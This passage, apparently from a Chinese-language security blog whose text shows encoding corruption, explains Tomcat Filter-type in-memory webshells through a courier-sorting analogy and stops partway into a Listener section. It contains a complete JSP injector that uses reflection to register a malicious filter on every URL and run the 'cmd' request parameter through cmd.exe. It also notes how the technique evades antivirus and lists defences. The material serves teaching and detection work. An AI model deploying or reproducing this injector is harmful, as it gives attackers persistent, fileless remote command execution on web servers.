</span><br><span class="line">   â€¢ **åˆ†ç±»å‘˜**ï¼šè´´ä¸ŠåŒºåŸŸæ ‡ç­¾ï¼ˆæ·»åŠ å“åº”å¤´ï¼‰  </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>ï¸âƒ£ **è§¦å‘ä¸‹ä¸€ç¯èŠ‚**  </span><br><span class="line">   æ¯ä¸ªåˆ†æ‹£å‘˜å¤„ç†å®Œéƒ½ä¼šå–Šï¼šâ€œä¸‹ä¸€ä¸ªï¼â€ï¼ˆè°ƒç”¨ `chain.doFilter()`ï¼‰ï¼Œç›´åˆ°ï¼š  </span><br><span class="line">   â€¢ **æ­£å¸¸æµç¨‹**ï¼šæ‰€æœ‰åˆ†æ‹£å‘˜å¤„ç†å®Œ â†’ åŒ…è£¹äº¤ç»™æ´¾é€å‘˜ï¼ˆServletï¼‰  </span><br><span class="line">   â€¢ **å¼‚å¸¸æµç¨‹**ï¼šæŸä¸ªåˆ†æ‹£å‘˜å‘ç°ç‚¸å¼¹ï¼ˆæ‹¦æˆªè¯·æ±‚ï¼‰ â†’ ç›´æ¥é€€å›ï¼ˆè¿”å›<span class="number">403</span>é”™è¯¯ï¼‰</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### **ä¸‰ã€åŠ¨æ€æ³¨å†ŒFilterï¼ˆå®‰æ’å†…é¬¼åˆ†æ‹£å‘˜ï¼‰**</span><br><span class="line">é»‘å®¢è¦å®‰æ’ä¸€ä¸ª **â€œå·æ‹åŒ…è£¹ä¿¡æ¯â€** çš„æ¶æ„åˆ†æ‹£å‘˜ï¼ˆå†…å­˜é©¬Filterï¼‰ï¼š  </span><br><span class="line"><span class="number">1.</span> **ä¼ªé€ æ¡£æ¡ˆ**ï¼ˆæ“ä½œFilterDefsï¼‰  </span><br><span class="line">   ```<span class="type">java</span>  </span><br><span class="line">   <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">   filterDef.setFilterName(<span class="string">&quot;é—´è°åˆ†æ‹£å‘˜&quot;</span>);  </span><br><span class="line">   filterDef.setFilterClass(EvilFilter.class);  </span><br></pre></td></tr></table></figure><br>   <em>ç›¸å½“äºåœ¨æ¡£æ¡ˆåº“é‡Œå¡å…¥å‡èº«ä»½</em></p><ol start="2"><li><p><strong>ç»‘å®šåˆ†æ‹£åŒºåŸŸ</strong>ï¼ˆæ“ä½œFilterMapsï¼‰  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap = <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);  <span class="comment">// ç›‘å¬æ‰€æœ‰åŒ…è£¹  </span></span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;é—´è°åˆ†æ‹£å‘˜&quot;</span>);  </span><br></pre></td></tr></table></figure><p><em>ä¿®æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼Œè®©æ‰€æœ‰åŒ…è£¹éƒ½ç»è¿‡è¿™ä¸ªå†…é¬¼</em></p></li><li><p><strong>è®¾ç½®æœ€é«˜ä¼˜å…ˆçº§</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST);  </span><br><span class="line">context.addFilterMapBefore(filterMap);  <span class="comment">// æ’é˜Ÿåˆ°æ‰€æœ‰åˆ†æ‹£å‘˜å‰é¢  </span></span><br></pre></td></tr></table></figure><p><em>è®©å†…é¬¼ç¬¬ä¸€ä¸ªå¤„ç†åŒ…è£¹ï¼Œæ–¹ä¾¿çªƒå–æ•°æ®</em></p></li></ol><hr><h3 id="å››ã€é˜²å¾¡å…³é”®ç‚¹"><a href="#å››ã€é˜²å¾¡å…³é”®ç‚¹" class="headerlink" title="å››ã€é˜²å¾¡å…³é”®ç‚¹"></a><strong>å››ã€é˜²å¾¡å…³é”®ç‚¹</strong></h3><ol><li><p><strong>ç›¯ç´§æ¡£æ¡ˆåº“</strong>ï¼ˆç›‘æ§FilterDefsï¼‰<br>å®šæœŸæ£€æŸ¥åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“ï¼Œæœ‰æ²¡æœ‰æ¥è·¯ä¸æ˜çš„æ–°å‘˜å·¥ï¼ˆæœªåœ¨web.xmlå£°æ˜çš„Filterï¼‰</p></li><li><p><strong>å®¡æŸ¥åˆ†æ‹£è§„åˆ™è¡¨</strong>ï¼ˆåˆ†æFilterMapsï¼‰<br>ç”¨å·¥å…·æ‰«ææ˜¯å¦æœ‰ç›‘å¬ <code>/*</code> çš„é«˜å±åˆ†æ‹£å‘˜ï¼ˆæ¯”å¦‚å†°è&#x2F;å“¥æ–¯æ‹‰ç‰¹å¾Filterï¼‰</p></li><li><p><strong>é™åˆ¶æƒé™</strong><br>åˆ†æ‹£å‘˜ä¸è¯¥æœ‰æ‹†åŒ…è£¹çš„æƒé™ï¼ˆç¦æ­¢Filterè°ƒç”¨ <code>Runtime.exec()</code> ç­‰å±é™©APIï¼‰</p></li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“"><a href="#ä¸€å¥è¯æ€»ç»“" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p>Tomcatçš„Filteræœºåˆ¶å°±åƒ <strong>ã€Œå¿«é€’åˆ†æ‹£æµæ°´çº¿ã€</strong>ï¼Œæ¯ä¸ªç¯èŠ‚çš„åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰æŒ‰è§„åˆ™æ£€æŸ¥åŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰ï¼Œè€Œå†…å­˜é©¬å°±æ˜¯é»‘å®¢å®‰æ’åœ¨æµæ°´çº¿ä¸Šçš„å†…é¬¼ï¼Œå·å·æ‹†çœ‹ä½ çš„å¿«é€’ï¼</p><ol><li>è·å–StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filter</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°StandardContext.filterDefsä¸­</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„ Filter å’Œ urlpattern ç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ°StandardContext.filterMapsä¸­(ä¸€èˆ¬ä¼šæ”¾åœ¨é¦–ä½)</li><li>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ªFilterConfig(ApplicationFilterConfig)ç±»ï¼Œä¼ å…¥StandardContextä¸filterDefsï¼Œå­˜æ”¾åˆ°filterConfigä¸­</li></ol><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">8</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Longlone&quot;</span>;</span><br><span class="line">    <span class="comment">// è·å–StandardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–filterConfigs</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="meta">@Override</span></span><br><span class="line">â€‹        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">â€‹            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">â€‹            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">â€‹                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">â€‹                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/C&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">â€‹                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">â€‹                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">â€‹                process.destroy();</span><br><span class="line">â€‹                <span class="keyword">return</span>;</span><br><span class="line">â€‹            &#125;</span><br><span class="line">â€‹            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="meta">@Override</span></span><br><span class="line">â€‹        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">// FilterDef</span></span><br><span class="line">â€‹    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">â€‹    filterDef.setFilter(filter);</span><br><span class="line">â€‹    filterDef.setFilterName(name);</span><br><span class="line">â€‹    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">â€‹    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">// FilterMap</span></span><br><span class="line">â€‹    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">â€‹    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">â€‹    filterMap.setFilterName(name);</span><br><span class="line">â€‹    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">â€‹    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">//ApplicationFilterConfig</span></span><br><span class="line">â€‹    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">â€‹    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">â€‹    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">â€‹    filterConfigs.put(name, filterConfig);</span><br><span class="line"></span><br><span class="line">â€‹    out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ <strong>ã€Œåœ¨å¿«é€’æµæ°´çº¿å®‰æ’å†…é¬¼ã€</strong> çš„æ¯”å–»æ¥è§£é‡Š Filterå‹å†…å­˜é©¬ çš„å®ç°åŸç†ï¼Œä¿è¯ä½ ç§’æ‡‚ğŸ‘‡</p><hr><h3 id="ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰"><a href="#ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰" class="headerlink" title="ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰"></a><strong>ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰</strong></h3><h4 id="1-æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å–-StandardContextï¼‰"><a href="#1-æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å–-StandardContextï¼‰" class="headerlink" title="1. æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å– StandardContextï¼‰"></a><strong>1. æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å– StandardContextï¼‰</strong></h4><p>â€¢ <strong>æ“ä½œç›®æ ‡</strong>ï¼šè·å– Tomcat çš„ <code>StandardContext</code> å¯¹è±¡ï¼ˆç›¸å½“äºå¿«é€’å…¬å¸çš„æ€»è°ƒåº¦ç³»ç»Ÿï¼‰<br>â€¢ <strong>å®ç°æ–¹å¼</strong>ï¼š<br>  é€šè¿‡åå°„ä» <code>Thread.currentThread().getContextClassLoader()</code> æˆ– <code>request.getServletContext()</code> ç­‰é€”å¾„é€†å‘è·å–<br>â€¢ <strong>å…³é”®æ€§</strong>ï¼š<br>  å°±åƒé»‘å®¢å¿…é¡»å…ˆæ‹¿åˆ°å¿«é€’å…¬å¸æ€»éƒ¨çš„é—¨ç¦å¡ï¼Œå¦åˆ™åç»­æ“ä½œæ— ä»è¿›è¡Œ  </p><h4 id="2-è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„-Filterï¼‰"><a href="#2-è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„-Filterï¼‰" class="headerlink" title="2. è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„ Filterï¼‰"></a><strong>2. è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„ Filterï¼‰</strong></h4><p>â€¢ <strong>ä»£ç ç¤ºä¾‹</strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(...)</span> &#123;  </span><br><span class="line">        <span class="comment">// æ£€æµ‹æ”»å‡»æŒ‡ä»¤ï¼ˆå¦‚è¯·æ±‚å‚æ•°å« cmd=whoamiï¼‰  </span></span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¿”å›ç»“æœ  </span></span><br><span class="line">            Runtime.getRuntime().exec(...);  </span><br><span class="line">        &#125;  </span><br><span class="line">        chain.doFilter(...); <span class="comment">// æ”¾è¡Œè¯·æ±‚  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä¼ªè£…æŠ€å·§</strong>ï¼š<br>  è®©å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆFilterï¼‰çœ‹èµ·æ¥åƒæ­£å¸¸å‘˜å·¥ï¼Œä½†æš—ä¸­æ‰§è¡Œçªƒå¬æˆ–ç ´å  </p><h4 id="3-ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º-FilterDefï¼‰"><a href="#3-ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º-FilterDefï¼‰" class="headerlink" title="3. ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º FilterDefï¼‰"></a><strong>3. ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º FilterDefï¼‰</strong></h4><p>â€¢ <strong>æ“ä½œæ­¥éª¤</strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;SecurityCheck&quot;</span>); <span class="comment">// ä¼ªè£…æˆå®‰æ£€å‘˜  </span></span><br><span class="line">filterDef.setFilterClass(EvilFilter.class);  </span><br><span class="line">standardContext.addFilterDef(filterDef); <span class="comment">// å¡å…¥åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“  </span></span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä½œç”¨</strong>ï¼š<br>  ç›¸å½“äºåœ¨å¿«é€’å…¬å¸çš„å‘˜å·¥æ¡£æ¡ˆåº“ä¸­ä¼ªé€ ä¸€ä»½ã€Œå®‰æ£€å‘˜ã€çš„æ¡£æ¡ˆ  </p><h4 id="4-ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º-FilterMapï¼‰"><a href="#4-ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º-FilterMapï¼‰" class="headerlink" title="4. ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º FilterMapï¼‰"></a><strong>4. ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º FilterMapï¼‰</strong></h4><p>â€¢ <strong>å…³é”®ä»£ç </strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// ç›‘å¬æ‰€æœ‰åŒ…è£¹è·¯å¾„  </span></span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;SecurityCheck&quot;</span>);  </span><br><span class="line">standardContext.addFilterMapBefore(filterMap); <span class="comment">// æ’é˜Ÿåˆ°è§„åˆ™è¡¨é¦–ä½  </span></span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä¸ºä½•è¦æ”¾é¦–ä½</strong>ï¼š<br>  ç¡®ä¿å†’ç‰Œåˆ†æ‹£å‘˜<strong>æœ€å…ˆæ¥è§¦åŒ…è£¹</strong>ï¼ˆä¼˜å…ˆå¤„ç†è¯·æ±‚ï¼‰ï¼Œæ–¹ä¾¿æ‹¦æˆªæˆ–ç¯¡æ”¹æ•°æ®  </p><h4 id="5-æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º-FilterConfigï¼‰"><a href="#5-æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º-FilterConfigï¼‰" class="headerlink" title="5. æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º FilterConfigï¼‰"></a><strong>5. æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º FilterConfigï¼‰</strong></h4><p>â€¢ <strong>æ ¸å¿ƒä»£ç </strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åå°„è·å– filterConfigsï¼ˆéœ€æ ¹æ®Tomcatç‰ˆæœ¬è°ƒæ•´ï¼‰  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">configsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">configsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">Map&lt;String, FilterConfig&gt; filterConfigs = (Map) configsField.get(standardContext);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆå†’ç‰Œå‘˜å·¥çš„å·¥ä½œè¯  </span></span><br><span class="line"><span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(standardContext, filterDef);  </span><br><span class="line">filterConfigs.put(<span class="string">&quot;SecurityCheck&quot;</span>, filterConfig);  </span><br></pre></td></tr></table></figure><br>â€¢ <strong>æ ¸å¿ƒä½œç”¨</strong>ï¼š<br>  ç»™å†’ç‰Œåˆ†æ‹£å‘˜é¢å‘ã€Œå·¥ä½œè¯ã€ï¼ˆFilterConfigï¼‰ï¼Œè®©åˆ†æ‹£ç³»ç»Ÿè®¤ä¸ºä»–æ˜¯åˆæ³•å‘˜å·¥  </p><hr><h3 id="äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ"><a href="#äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ" class="headerlink" title="äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ"></a><strong>äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æŠ€æœ¯ç‚¹</strong></th><th><strong>ç±»æ¯”è§£é‡Š</strong></th><th><strong>ç»•è¿‡æ£€æµ‹çš„å…³é”®</strong></th></tr></thead><tbody><tr><td><strong>ä¸è½åœ°æ–‡ä»¶</strong></td><td>å†’ç‰Œåˆ†æ‹£å‘˜æ²¡æœ‰çº¸è´¨æ¡£æ¡ˆï¼ˆæ— .classæ–‡ä»¶ï¼‰</td><td>ä¼ ç»Ÿæ€æ¯’è½¯ä»¶åªæŸ¥æ¡£æ¡ˆåº“ï¼Œæ— æ³•å‘ç°å†…å­˜ä¸­çš„å¹½çµå‘˜å·¥</td></tr><tr><td><strong>å¯„ç”Ÿåœ¨StandardContext</strong></td><td>å†…é¬¼ä¿¡æ¯å†™å…¥å¿«é€’å…¬å¸æ€»éƒ¨çš„è°ƒåº¦ç³»ç»Ÿï¼ˆå†…å­˜å¯¹è±¡ï¼‰</td><td>Tomcaté‡å¯å‰æ¶æ„é…ç½®ä¼šä¸€ç›´ç”Ÿæ•ˆ</td></tr><tr><td><strong>åŠ¨æ€æ³¨å†Œæœºåˆ¶</strong></td><td>åˆ©ç”¨Tomcatå…è®¸ä¸´æ—¶å·¥ï¼ˆåŠ¨æ€Filterï¼‰çš„åˆæ³•åŠŸèƒ½</td><td>ç®¡ç†å‘˜å¾ˆéš¾åŒºåˆ†æ­£å¸¸åŠ¨æ€æ³¨å†Œå’Œæ¶æ„æ³¨å…¥</td></tr></tbody></table><hr><h3 id="ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾"><a href="#ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾" class="headerlink" title="ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾"></a><strong>ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµè§ˆå™¨è¯·æ±‚ â†’ Tomcatæ¥æ”¶è¯·æ±‚  </span><br><span class="line">     â†“  </span><br><span class="line">StandardContext è°ƒåº¦ â†’ ä¼˜å…ˆè°ƒç”¨æ¶æ„Filterï¼ˆé¦–ä½ï¼‰  </span><br><span class="line">     â†“  </span><br><span class="line">æ¶æ„Filterè§£æå‚æ•° â†’ è‹¥å«æ”»å‡»æŒ‡ä»¤åˆ™æ‰§è¡Œç³»ç»Ÿå‘½ä»¤  </span><br><span class="line">     â†“  </span><br><span class="line">è¿”å›ç¯¡æ”¹åçš„å“åº” â†’ æµè§ˆå™¨æ˜¾ç¤ºç»“æœ  </span><br></pre></td></tr></table></figure><hr><h3 id="å››ã€é˜²å¾¡è¦ç‚¹"><a href="#å››ã€é˜²å¾¡è¦ç‚¹" class="headerlink" title="å››ã€é˜²å¾¡è¦ç‚¹"></a><strong>å››ã€é˜²å¾¡è¦ç‚¹</strong></h3><ol><li><p><strong>ç›‘æ§StandardContextå˜åŠ¨</strong>ï¼š<br>å®šæœŸæ£€æŸ¥ <code>filterDefs</code> å’Œ <code>filterMaps</code> æ˜¯å¦æœ‰æœªæˆæƒçš„æ–°å¢æ¡ç›®  </p></li><li><p><strong>ç¦ç”¨é«˜å±API</strong>ï¼š<br>é€šè¿‡å®‰å…¨ç­–ç•¥é™åˆ¶ <code>Runtime.exec()</code> ç­‰å±é™©æ–¹æ³•çš„è°ƒç”¨  </p></li><li><p><strong>ä½¿ç”¨RASPé˜²æŠ¤</strong>ï¼š<br>åœ¨åº”ç”¨å±‚éƒ¨ç½²è¿è¡Œæ—¶é˜²æŠ¤ï¼ˆç±»ä¼¼åœ¨åˆ†æ‹£æµæ°´çº¿è£…Xå…‰æœºï¼‰</p></li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“-1"><a href="#ä¸€å¥è¯æ€»ç»“-1" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p>Filterå‹å†…å­˜é©¬å°±åƒ <strong>ã€Œå¯„ç”Ÿåœ¨Tomcatå¤§è„‘ä¸­çš„æœ¨é©¬ç—…æ¯’ã€</strong>ï¼Œé€šè¿‡ç¯¡æ”¹å†…å­˜ä¸­çš„é…ç½®æ•°æ®å®ç°æ— æ–‡ä»¶é©»ç•™ï¼Œæ˜¯Webå®‰å…¨é¢†åŸŸçš„é¡¶çº§æ¸—é€æ‰‹æ³•ï¼</p><h1 id="Tomcat-Listener"><a href="#Tomcat-Listener" class="headerlink" title="Tomcat-Listener"></a>Tomcat-Listener</h1><p>åœ¨Java WEBä¸­ï¼Œä¸‰ç»„ä»¶çš„æ‰§è¡Œé¡ºåºæ˜¯Listener -&gt; Filter -&gt; Servletã€‚</p><p>Tomcatä¸­çš„Listeneræ¥æºäºä¸¤éƒ¨åˆ†ï¼šä¸€æ˜¯ä»<code>web.xml</code>é…ç½®æ–‡ä»¶ä¸­å®ä¾‹åŒ–çš„Listenerï¼Œè¿™éƒ¨åˆ†æˆ‘ä»¬æ— 